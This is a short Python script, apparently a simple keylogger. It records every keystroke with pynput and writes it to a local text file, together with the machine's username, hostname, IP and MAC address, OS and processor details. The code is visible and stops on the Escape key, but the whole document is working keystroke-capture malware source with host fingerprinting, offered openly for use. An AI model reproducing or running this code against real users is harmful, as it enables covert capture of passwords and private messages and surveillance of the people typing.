from pynput import keyboard
from datetime import datetime
import getpass
import socket
import platform
from getmac import get_mac_address as gma


# file = open('keylogger.txt','w').close()   # clears the file when you use it again

file = open('keylogger.txt', 'a')
file.write(f"\t\tLogging started at : {datetime.now()}\n\n")

username = getpass.getuser()
hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)
os = platform.system()
psr = platform.processor()
machine = platform.machine()
version = platform.version()
mac = gma()

file.write(f"""
--- System Info ---
User: {username}
Hostname: {hostname}
Machine: {machine}
IP: {ip}
OS: {os}
Mac: {mac}
Processor: {psr}
Version: {version}
--- System Info ---\n\n
--- Keylogged data ---\n
""")


def on_press(key):
    try:
        file.write('{}'.format(key.char))       # pressed key inserted to the file
        print("{} pressed".format(key.char))
    except AttributeError:
        print("{} pressed".format(key))         # special key handling
        if key == keyboard.Key.shift:           #shift key
            file.write("")
        elif key == keyboard.Key.space:         # space key
            file.write(" ")
        elif key == keyboard.Key.enter:         # enter key
            file.write("\n")
        elif key == keyboard.Key.tab:           # tab key
            file.write("\t")
        elif key == keyboard.Key.backspace:
            file.seek(file.tell() - 1)          # deleting the last entered character in file
            file.truncate()
        elif key==keyboard.Key.esc:             # esc key {escape key}
            file.write('\n\n---------Thank You---------')
            
    file.flush()

# to exit the program - press esc (escape button of keyboard)
def on_release(key):
    if key == keyboard.Key.esc:
        file.close()
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

